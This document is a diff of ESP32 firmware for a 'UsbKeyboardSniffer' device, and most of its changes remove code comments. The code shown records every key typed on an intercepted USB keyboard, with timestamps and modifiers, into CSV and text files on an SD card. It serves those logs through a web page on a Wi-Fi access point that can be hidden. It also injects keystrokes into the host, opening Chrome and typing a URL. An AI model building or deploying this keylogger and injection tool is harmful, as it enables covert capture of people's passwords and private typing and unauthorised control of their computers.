@@ -11,7 +11,6 @@
 ESP32Time rtc(0);
 
 const char* ssid = "UsbKeyboardSniffer";
-//const char* ssid = "hotspot";
 const char* password = "Password"; // cahnge this as you like
 
 WebServer server(80);
@@ -227,7 +226,7 @@ const char* hidUsageCodeToString(uint8_t usageCode) {
         case 0x81: return "Sleep";
         case 0x83: return "Wake";
         case 0x39: return "Caps lock"; 
-        case 0x58: return "Numpad Enter"; // Assuming 0x58 as the usage code for Numpad Enter
+        case 0x58: return "Numpad Enter"; 
         case 0x46: return "Print Screen";
         case 0x47: return "Scroll Lock";
         case 0x48: return "Pause";
@@ -275,13 +274,13 @@ void setup() {
 
 #ifdef Hotspot
   WiFi.softAPConfig(local_IP, gateway, subnet);
-  WiFi.softAP(ssid, password, 1, 1);  // The last '1' sets the SSID as hidden
+  WiFi.softAP(ssid, password, 1, 1);  
 
   Serial.println("Access Point Started");
   Serial.print("IP Address: ");
   Serial.println(WiFi.softAPIP());
 #else
-  WiFi.config(local_IP, gateway, subnet);  // Set static IP before connecting
+  WiFi.config(local_IP, gateway, subnet); 
   WiFi.begin(ssid, password);
   while (WiFi.status() != WL_CONNECTED) {
     delay(1000);
@@ -328,8 +327,8 @@ if (!SPIFFS.begin(true)) {
         server.on("/set-time", HTTP_POST, handleSetTime);
         server.on("/key-capture-page", HTTP_GET, handleKeyCapturePage);
           server.on("/key-capture", HTTP_POST, handleKeyCapture);
-          server.on("/rick-roll", HTTP_GET, handleRickRoll); // Handler for activating the Rick Roll
-server.on("/rick-roll-page", HTTP_GET, handleRickRollPage); // Handler for displaying the Rick Roll page
+          server.on("/rick-roll", HTTP_GET, handleRickRoll); 
+server.on("/rick-roll-page", HTTP_GET, handleRickRollPage); 
 
 
   server.begin();
@@ -467,9 +466,9 @@ for (int i =0;i <= 5;i++)
 
 void printStructToCSV(const Key_InfoStruct& keyInfo) {
   if (isStructZero(keyInfo)) {
-    return; // Structure is considered zero, so don't print anything
+    return; 
   }
-  File file = SD_MMC.open("/key_info.csv", FILE_APPEND); // Use FILE_APPEND to append data
+  File file = SD_MMC.open("/key_info.csv", FILE_APPEND); 
   if (!file) {
     Serial.println("Error opening file for writing");
     return;
@@ -478,10 +477,10 @@ void printStructToCSV(const Key_InfoStruct& keyInfo) {
     file.println("AsciiKeys0,AsciiKeys1,AsciiKeys2,AsciiKeys3,AsciiKeys4,AsciiKeys5,SpecialKey,LeftCtrl,LeftShift,LeftAlt,LeftStart,RightCtrl,RightShift,RightAlt,RightStart,Time,Date");
   }
  for (int i = 0; i < 6; ++i) {
-    if (keyInfo.AsciiKeys[i] != '\0') { // Check if the character is not the null character
+    if (keyInfo.AsciiKeys[i] != '\0') { 
       file.print(keyInfo.AsciiKeys[i]);
     } else {
-      file.print("NULL"); // Print a space or some placeholder if the character is the null character
+      file.print("NULL"); 
     }
     file.print(",");
   }
@@ -497,17 +496,17 @@ void printStructToCSV(const Key_InfoStruct& keyInfo) {
   file.print( rtc.getTime()); file.print(",");
    file.print(rtc.getDate() );
 
-  file.println(); // End of line
+  file.println(); 
   file.close();
 }
 void printKeysToTXT(const Key_InfoStruct& keyInfo) {
-    File file = SD_MMC.open("/key_info.txt", FILE_APPEND); // Use FILE_APPEND to append data
+    File file = SD_MMC.open("/key_info.txt", FILE_APPEND); 
     if (!file) {
         Serial.println("Error opening file for writing");
         return;
     }
       if (keyInfo.AsciiKeys[0] == '\0') {
-    return; // Structure is considered zero, so don't print anything
+    return; 
   }
         file.print(keyInfo.AsciiKeys[0]);
     file.close(); // Close the file after writing
@@ -648,7 +647,7 @@ void handleShowTXT() {
                   "<div id='txtContent' style='white-space: pre-wrap;'>TXT data will appear here...</div>"
                   "<button onclick=\"window.location.href='/'\">Back</button>"
                   "<button onclick=\"window.location.href='/clear-files'\">Clear CSV and TXT</button>"
-                  "<button onclick=\"window.location.href='/download-txt'\">Download TXT</button>" // Download TXT button
+                  "<button onclick=\"window.location.href='/download-txt'\">Download TXT</button>" 
                   "</body></html>";
     server.send(200, "text/html", html);
     Origin = "TXT";
@@ -702,7 +701,7 @@ void handleShowTime() {
 "<head>\n"
 "<title>Set Current Time</title>\n"
 "<style>\n"
-"  form div { display: inline-block; margin-right: 10px; }\n" // Spacing between inputs
+"  form div { display: inline-block; margin-right: 10px; }\n" 
 "</style>\n"
 "<script>\n"
 "function updateTime() {\n"
@@ -792,8 +791,8 @@ void handleKeyCapturePage() {
         "<title>Key Capture Page</title>"
         "<style>"
             ".modifiers { display: flex; justify-content: start; align-items: flex-start; }"
-            ".modifiers > div { margin-right: 20px; }" // Add some space between the left and right modifiers
-            "label { display: block; margin: 5px 0; }" // Improve spacing and alignment
+            ".modifiers > div { margin-right: 20px; }" 
+            "label { display: block; margin: 5px 0; }" 
             "#message { display: none; position: absolute; top: 20px; right: 20px; padding: 10px; background-color: #90ee90; border-radius: 8px; }"
         "</style>"
     "</head>"
@@ -849,7 +848,7 @@ void handleKeyCapturePage() {
                     "setTimeout(function() { document.getElementById('message').style.display = 'none'; }, 1000);"
                 "})"
                 ".catch(error => console.error('Error:', error));"
-                "event.preventDefault();" // Prevent the default action to avoid interfering with normal browser shortcuts
+                "event.preventDefault();" 
             "}, false);"
         "</script>"
     "</body>"
@@ -887,11 +886,11 @@ void handleKeyCapture() {
     bool controlLeft = doc["modifiers"]["ControlLeft"].as<bool>();
     bool shiftLeft = doc["modifiers"]["ShiftLeft"].as<bool>();
     bool altLeft = doc["modifiers"]["AltLeft"].as<bool>();
-    bool metaLeft = doc["modifiers"]["MetaLeft"].as<bool>(); // GUI key (Windows/Command)
+    bool metaLeft = doc["modifiers"]["MetaLeft"].as<bool>(); 
     bool controlRight = doc["modifiers"]["ControlRight"].as<bool>();
     bool shiftRight = doc["modifiers"]["ShiftRight"].as<bool>();
     bool altRight = doc["modifiers"]["AltRight"].as<bool>();
-    bool metaRight = doc["modifiers"]["MetaRight"].as<bool>(); // GUI key (Windows/Command)
+    bool metaRight = doc["modifiers"]["MetaRight"].as<bool>(); 
 
 
 
@@ -1055,7 +1054,7 @@ void handleRickRollPage() {
 //     //press enter
 // }
 void handleRickRoll() {
-  server.sendHeader("Location", "/rick-roll-page", true);   // Redirect to rick-roll-page
+  server.sendHeader("Location", "/rick-roll-page", true);   
   server.send(302, "text/plain", "");
   memset(&KeyInjectionStruct, 0, sizeof(keyboardHID));
   KeyInjectionStruct.MODIFIER |= 0x80; //windows key
@@ -1076,19 +1075,19 @@ void handleRickRoll() {
 
 
 void sendKeyPress(uint8_t keyCode, bool shift) {
-    memset(&KeyInjectionStruct, 0, sizeof(keyboardHID)); // Clear the structure
+    memset(&KeyInjectionStruct, 0, sizeof(keyboardHID));
     if (shift) {
-        KeyInjectionStruct.MODIFIER |= 0x20; // Add right SHIFT to MODIFIER
+        KeyInjectionStruct.MODIFIER |= 0x20; 
     }
     KeyInjectionStruct.KEYCODE1 = keyCode; // Set the key code
-    Serial2.write((const uint8_t *)&KeyInjectionStruct, sizeof(keyboardHID)); // Send the key press
+    Serial2.write((const uint8_t *)&KeyInjectionStruct, sizeof(keyboardHID)); 
     delay(50);
-    memset(&KeyInjectionStruct, 0, sizeof(keyboardHID)); // Clear the structure for key release
-    Serial2.write((const uint8_t *)&KeyInjectionStruct, sizeof(keyboardHID)); // Send the key release
+    memset(&KeyInjectionStruct, 0, sizeof(keyboardHID)); 
+    Serial2.write((const uint8_t *)&KeyInjectionStruct, sizeof(keyboardHID)); 
     delay(50);
 }
 
-// Continuing the typeTheString function to type the full link
+
 void typeTheString() {
     // Typing "chrome "
     sendKeyPress(0x06, false); // 'c'
@@ -1117,7 +1116,7 @@ void typeTheString() {
     sendKeyPress(0x0B, false); // 'h'
     sendKeyPress(0x38, true); // '?'
     sendKeyPress(0x19, false); // 'v'
-    sendKeyPress(0x2E, false);  // '=' (Shift required for '=')
+    sendKeyPress(0x2E, false);  // '=' 
     sendKeyPress(0x07, false); // 'd'
     sendKeyPress(0x14, true); // 'Q'
     sendKeyPress(0x1A, false); // 'w'
